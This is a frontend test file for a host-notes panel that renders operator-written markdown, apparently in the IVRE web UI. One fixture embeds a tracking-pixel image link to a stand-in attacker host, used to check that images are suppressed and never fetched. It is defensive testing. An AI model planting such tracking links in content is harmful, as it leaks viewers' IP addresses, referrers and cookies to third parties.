/* @vitest-environment jsdom */
import { render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { HostNotesPanel } from "./HostNotesPanel";

import type { HostNoteResult, Note } from "@/lib/api";

// Mutable container the ``useHostNote`` mock reads from on every
// render.  Each test seeds it once and renders ``HostNotesPanel``;
// the mock returns a React-Query-shaped result object so the
// component's branching (``isLoading`` / ``isError`` / ``data``)
// fires deterministically.
let mockState: {
  isLoading: boolean;
  isError: boolean;
  error: Error | null;
  data: HostNoteResult | undefined;
} = {
  isLoading: false,
  isError: false,
  error: null,
  data: undefined,
};

vi.mock("@/lib/api", async () => {
  // Preserve the real type exports so the component's imports
  // (``Note`` / ``HostNoteResult``) still resolve in the test
  // module; only the hook is mocked.
  const actual = await vi.importActual<typeof import("@/lib/api")>(
    "@/lib/api",
  );
  return {
    ...actual,
    useHostNote: () => mockState,
  };
});

afterEach(() => {
  mockState = {
    isLoading: false,
    isError: false,
    error: null,
    data: undefined,
  };
});

const sampleNote: Note = {
  entity_type: "host",
  entity_key: "192.0.2.10",
  body: "## Investigation\n\nFollowing up on the **C2** traffic.",
  revision: 3,
  created_at: "2026-05-01T10:00:00Z",
  created_by: "alice@example.org",
  updated_at: "2026-05-12T14:32:11Z",
  updated_by: "bob@example.org",
};

describe("HostNotesPanel", () => {
  it("shows a loading skeleton while the query is in flight", () => {
    mockState = {
      isLoading: true,
      isError: false,
      error: null,
      data: undefined,
    };

    render(<HostNotesPanel addr="192.0.2.10" />);

    // Section heading is rendered immediately so the layout does
    // not jump when the body arrives.
    expect(
      screen.getByRole("heading", { name: /^notes$/i }),
    ).toBeInTheDocument();
    // The skeleton placeholder is testable via its ``data-testid``;
    // we deliberately keep the marker stable so future styling
    // tweaks don't break this assertion.
    const skeleton = screen.getByTestId("host-notes-loading");
    expect(skeleton).toBeInTheDocument();
    // ``role="status"`` (implies ``aria-live="polite"``) makes
    // assistive tech announce the loading state when the panel
    // first appears; the SR-only text label provides the
    // announced string.
    expect(skeleton).toHaveAttribute("role", "status");
    expect(skeleton).toHaveAccessibleName(/loading note/i);
    // No empty-state or error markup during loading.
    expect(screen.queryByTestId("host-notes-empty")).toBeNull();
    expect(screen.queryByTestId("host-notes-error")).toBeNull();
  });

  it("renders the markdown body + footer metadata when a note exists", () => {
    mockState = {
      isLoading: false,
      isError: false,
      error: null,
      data: { kind: "found", note: sampleNote },
    };

    render(<HostNotesPanel addr="192.0.2.10" />);

    // Markdown ``## Investigation`` lands on ``<h5>`` (level 5)
    // after the heading-level remap: the section above this body
    // is ``<h3>``, and an operator-authored ``##`` would
    // otherwise emit ``<h2>`` -- *higher* in the document
    // hierarchy than the section it lives inside, which would
    // break screen-reader heading navigation.  ``#`` -> h4 and
    // ``##`` -> h5 keep the order monotone within the section.
    expect(
      screen.getByRole("heading", { name: /investigation/i, level: 5 }),
    ).toBeInTheDocument();
    // No ``<h2>`` from the markdown body -- the remap is what
    // prevents the backwards-hierarchy jump.
    expect(
      screen.queryByRole("heading", { name: /investigation/i, level: 2 }),
    ).toBeNull();
    expect(screen.getByText("C2")).toBeInTheDocument();
    // Footer surfaces who and when, and includes the revision so
    // operators can spot stale tabs.
    expect(screen.getByText(/bob@example\.org/)).toBeInTheDocument();
    expect(screen.getByText(/rev 3/)).toBeInTheDocument();
  });

  it("suppresses ``<img>`` tags and surfaces the alt text instead", () => {
    // Operator-authored ``![alt](https://attacker/track)`` would
    // otherwise cause the viewing browser to GET the URL on
    // render, leaking IP / Referer / cookies to a third party
    // (the standard email-tracking-pixel attack).  The override
    // installs an ``img`` component that returns the alt text in
    // italics and never emits a ``src`` attribute, so the
    // browser never makes the request.
    mockState = {
      isLoading: false,
      isError: false,
      error: null,
      data: {
        kind: "found",
        note: {
          ...sampleNote,
          body: "Caption: ![viewer-tracking-pixel](https://attacker.example/track?h=192.0.2.10)",
        },
      },
    };

    const { container } = render(<HostNotesPanel addr="192.0.2.10" />);

    // No ``<img>`` element in the rendered tree at all -- the
    // override returns text, not an image.
    expect(container.querySelectorAll("img")).toHaveLength(0);
    // The alt text surfaces so operators who pasted
    // ``![alt](...)`` still see *something* identifying.
    expect(screen.getByText("viewer-tracking-pixel")).toBeInTheDocument();
  });

  it("adds ``rel='noopener noreferrer'`` to outbound links", () => {
    // The IVRE detail-sheet URL typically contains the host IP
    // being viewed, so leaking it as ``Referer`` to a destination
    // operator-pasted into a note is a metadata leak.  The
    // ``<a>`` override adds the ``rel`` attribute so a user
    // click cannot leak the source URL and the destination
    // cannot access ``window.opener``.
    mockState = {
      isLoading: false,
      isError: false,
      error: null,
      data: {
        kind: "found",
        note: {
          ...sampleNote,
          body: "See [the writeup](https://example.org/) for details.",
        },
      },
    };

    const { container } = render(<HostNotesPanel addr="192.0.2.10" />);
    const link = container.querySelector("a");
    expect(link).not.toBeNull();
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
    expect(link).toHaveAttribute("href", "https://example.org/");
  });

  it("wraps gfm tables in an ``overflow-x-auto`` container", () => {
    // GFM tables can be wider than the host detail sheet (many
    // columns or long unbreakable cells -- URLs / hashes /
    // IPv6).  Without an overflow container the table forces
    // the entire sheet to widen and produces page-level
    // horizontal scroll.  The ``table`` override wraps every
    // ``<table>`` in a ``<div class="overflow-x-auto">`` so the
    // overflow is scoped to the table.
    mockState = {
      isLoading: false,
      isError: false,
      error: null,
      data: {
        kind: "found",
        note: {
          ...sampleNote,
          body: "| col1 | col2 |\n| ---- | ---- |\n| a    | b    |",
        },
      },
    };

    const { container } = render(<HostNotesPanel addr="192.0.2.10" />);
    const table = container.querySelector("table");
    expect(table).not.toBeNull();
    // The immediate parent of the ``<table>`` is the
    // override-installed wrapper carrying ``overflow-x-auto``.
    expect(table?.parentElement?.className).toContain("overflow-x-auto");
  });

  it("shows an empty-state placeholder when the note is absent (404)", () => {
    mockState = {
      isLoading: false,
      isError: false,
      error: null,
      data: { kind: "absent" },
    };

    render(<HostNotesPanel addr="192.0.2.10" />);

    expect(screen.getByTestId("host-notes-empty")).toBeInTheDocument();
    expect(
      screen.getByText(/no notes for this host yet/i),
    ).toBeInTheDocument();
    // Heading is still visible so the affordance "Notes" is
    // discoverable.  An edit button (PR-D feature) would naturally
    // slot in next to the empty-state text.
    expect(
      screen.getByRole("heading", { name: /^notes$/i }),
    ).toBeInTheDocument();
  });

  it("hides the entire section when the backend is unavailable (501)", () => {
    mockState = {
      isLoading: false,
      isError: false,
      error: null,
      data: { kind: "unavailable" },
    };

    const { container } = render(<HostNotesPanel addr="192.0.2.10" />);

    // The component returns ``null`` -- the rendered tree is
    // empty, no heading, no body, no permanent "feature missing"
    // notice for every viewer on a Postgres deployment.
    expect(container).toBeEmptyDOMElement();
    expect(screen.queryByRole("heading", { name: /^notes$/i })).toBeNull();
  });

  it("renders an error message on other failures (5xx / network)", () => {
    mockState = {
      isLoading: false,
      isError: true,
      error: new Error("GET /cgi/notes/host/... failed: 500 Server Error"),
      data: undefined,
    };

    render(<HostNotesPanel addr="192.0.2.10" />);

    expect(screen.getByTestId("host-notes-error")).toBeInTheDocument();
    expect(
      screen.getByText(/failed to load note/i),
    ).toBeInTheDocument();
    expect(screen.getByText(/500 Server Error/)).toBeInTheDocument();
  });
});
